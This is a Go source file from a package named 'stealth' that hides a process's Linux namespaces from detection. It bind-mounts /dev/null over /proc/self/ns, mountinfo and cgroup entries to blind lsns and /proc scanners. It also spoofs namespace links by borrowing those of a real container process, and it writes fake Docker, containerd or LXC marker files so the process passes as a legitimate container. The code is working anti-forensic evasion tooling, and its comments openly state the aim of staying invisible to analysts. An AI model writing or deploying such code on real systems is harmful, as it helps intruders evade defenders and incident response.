package stealth

import (
	"crypto/rand"
	"fmt"
	"os"
	"strconv"
	"strings"
	"syscall"
)

// HideNamespace applies all namespace hiding techniques.
// Makes our namespace invisible to lsns, /proc scanners, and container inspection tools.
func HideNamespace() error {
	// Bind mount /dev/null over our ns entries so tools can't read our namespace IDs
	hideNSEntries()

	// Generate container metadata so if found, we look like a legitimate container
	containerID := GenerateContainerID()
	return WriteContainerMetadata(containerID)
}

// hideNSEntries bind-mounts /dev/null over /proc/self/ns/* entries.
// After this, tools reading our ns inodes see /dev/null instead.
func hideNSEntries() {
	nsTypes := []string{"pid", "mnt", "net", "uts", "ipc", "cgroup", "user"}
	for _, ns := range nsTypes {
		path := fmt.Sprintf("/proc/self/ns/%s", ns)
		syscall.Mount("/dev/null", path, "", syscall.MS_BIND, "")
	}
}

// CamouflagAsContainer creates artifacts that make our namespace look like
// it belongs to a known container runtime.
func CamouflagAsContainer(runtime string) error {
	containerID := GenerateContainerID()

	switch runtime {
	case "docker":
		return camouflagDocker(containerID)
	case "containerd":
		return camouflagContainerd(containerID)
	case "lxc":
		return camouflageContainersLXC(containerID)
	default:
		return camouflagDocker(containerID)
	}
}

// inPrivateMountNS returns true if the current process is in a mount namespace
// different from PID 1's. Writing container artifacts outside a private mount
// namespace would corrupt the host filesystem.
func inPrivateMountNS() (bool, error) {
	selfMnt, err := os.Readlink("/proc/self/ns/mnt")
	if err != nil {
		return false, fmt.Errorf("cannot read own mnt ns: %v", err)
	}
	initMnt, err := os.Readlink("/proc/1/ns/mnt")
	if err != nil {
		return false, fmt.Errorf("cannot read init mnt ns: %v", err)
	}
	return selfMnt != initMnt, nil
}

// requirePrivateMountNS returns an error if we are not in a private mount namespace.
func requirePrivateMountNS() error {
	private, err := inPrivateMountNS()
	if err != nil {
		return err
	}
	if !private {
		return fmt.Errorf("refusing to write container artifacts: not in a private mount namespace")
	}
	return nil
}

func camouflagDocker(containerID string) error {
	if err := requirePrivateMountNS(); err != nil {
		return err
	}

	// Docker's canonical indicator — critical marker file
	if err := os.WriteFile("/.dockerenv", []byte{}, 0644); err != nil {
		return fmt.Errorf("docker camouflage: %v", err)
	}

	// Container hostname is first 12 chars of ID
	shortID := containerID[:12]
	os.WriteFile("/etc/hostname", []byte(shortID+"\n"), 0644)

	// Docker-style /etc/hosts
	hosts := fmt.Sprintf("127.0.0.1\tlocalhost\n::1\tlocalhost\n172.17.0.2\t%s\n", shortID)
	os.WriteFile("/etc/hosts", []byte(hosts), 0644)

	// Docker DNS resolver
	os.WriteFile("/etc/resolv.conf", []byte("nameserver 127.0.0.11\noptions ndots:0\n"), 0644)

	// Docker cgroup paths
	os.MkdirAll(fmt.Sprintf("/sys/fs/cgroup/docker/%s", containerID), 0755)

	return nil
}

func camouflagContainerd(containerID string) error {
	if err := requirePrivateMountNS(); err != nil {
		return err
	}
	os.MkdirAll("/run/containerd/io.containerd.runtime.v2.task/default", 0755)
	if err := os.WriteFile(
		fmt.Sprintf("/run/containerd/io.containerd.runtime.v2.task/default/%s", containerID[:12]),
		[]byte(""),
		0644,
	); err != nil {
		return fmt.Errorf("containerd camouflage: %v", err)
	}

	// Containerd uses similar hostname convention
	os.WriteFile("/etc/hostname", []byte(containerID[:12]+"\n"), 0644)
	os.WriteFile("/etc/resolv.conf", []byte("nameserver 10.96.0.10\nsearch default.svc.cluster.local svc.cluster.local cluster.local\noptions ndots:5\n"), 0644)

	return nil
}

func camouflageContainersLXC(containerID string) error {
	if err := requirePrivateMountNS(); err != nil {
		return err
	}
	os.MkdirAll("/dev/lxc", 0755)
	if err := os.WriteFile("/dev/lxc/console", []byte{}, 0644); err != nil {
		return fmt.Errorf("lxc camouflage: %v", err)
	}

	lxcConfig := fmt.Sprintf("lxc.uts.name = %s\nlxc.rootfs.path = /\nlxc.arch = amd64\n", containerID[:12])
	os.MkdirAll("/etc/lxc", 0755)
	os.WriteFile("/etc/lxc/config", []byte(lxcConfig), 0644)

	return nil
}

// SpoofNSLinks makes our namespace entries point to the same inodes as a
// legitimate container process. If an analyst compares ns inodes, ours match
// a known container.
func SpoofNSLinks() error {
	// Find a container-managed process to copy ns links from
	targetPID := findContainerProcess()
	if targetPID == 0 {
		return fmt.Errorf("no container process found to spoof")
	}

	nsTypes := []string{"pid", "mnt", "net", "uts"}
	for _, ns := range nsTypes {
		src := fmt.Sprintf("/proc/%d/ns/%s", targetPID, ns)
		dst := fmt.Sprintf("/proc/self/ns/%s", ns)

		// Unmount any existing bind (from hideNSEntries)
		syscall.Unmount(dst, syscall.MNT_DETACH)

		// Bind mount the container's ns entry over ours
		if err := syscall.Mount(src, dst, "", syscall.MS_BIND, ""); err != nil {
			continue
		}
	}

	return nil
}

// findContainerProcess looks for a process managed by a container runtime.
func findContainerProcess() int {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return 0
	}

	for _, entry := range entries {
		pid, err := strconv.Atoi(entry.Name())
		if err != nil || pid <= 2 {
			continue
		}

		// Check if this process is in a non-root cgroup (container indicator)
		cgroupData, err := os.ReadFile(fmt.Sprintf("/proc/%d/cgroup", pid))
		if err != nil {
			continue
		}

		cgroupStr := string(cgroupData)
		if strings.Contains(cgroupStr, "docker") ||
			strings.Contains(cgroupStr, "containerd") ||
			strings.Contains(cgroupStr, "kubepods") ||
			strings.Contains(cgroupStr, "lxc") {
			return pid
		}
	}

	return 0
}

// HideFromLsns makes us invisible to the lsns command.
// lsns works by scanning /proc/*/ns/* — if our entries are hidden,
// it cannot discover our namespace.
func HideFromLsns() error {
	// Bind mount /dev/null over all our ns entries
	hideNSEntries()

	// Also hide /proc/self/mountinfo (reveals our mount namespace details)
	syscall.Mount("/dev/null", "/proc/self/mountinfo", "", syscall.MS_BIND, "")

	// Hide /proc/self/cgroup (reveals our cgroup namespace)
	syscall.Mount("/dev/null", "/proc/self/cgroup", "", syscall.MS_BIND, "")

	return nil
}

// GenerateContainerID creates a realistic 64-character hex container ID.
func GenerateContainerID() string {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		// Fallback: deterministic but unique-looking ID based on PID and time
		for i := range b {
			b[i] = byte((os.Getpid() + i*31) & 0xff)
		}
	}
	return fmt.Sprintf("%x", b)
}

// WriteContainerMetadata writes files that container inspection tools expect.
func WriteContainerMetadata(containerID string) error {
	if err := requirePrivateMountNS(); err != nil {
		return err
	}
	shortID := containerID[:12]

	os.WriteFile("/.dockerenv", []byte{}, 0644)
	os.WriteFile("/etc/hostname", []byte(shortID+"\n"), 0644)

	hosts := fmt.Sprintf(
		"127.0.0.1\tlocalhost\n"+
			"::1\tlocalhost ip6-localhost ip6-loopback\n"+
			"fe00::0\tip6-localnet\n"+
			"ff00::0\tip6-mcastprefix\n"+
			"ff02::1\tip6-allnodes\n"+
			"ff02::2\tip6-allrouters\n"+
			"172.17.0.2\t%s\n", shortID)
	os.WriteFile("/etc/hosts", []byte(hosts), 0644)

	resolv := "nameserver 127.0.0.11\noptions ndots:0\n"
	os.WriteFile("/etc/resolv.conf", []byte(resolv), 0644)

	return nil
}
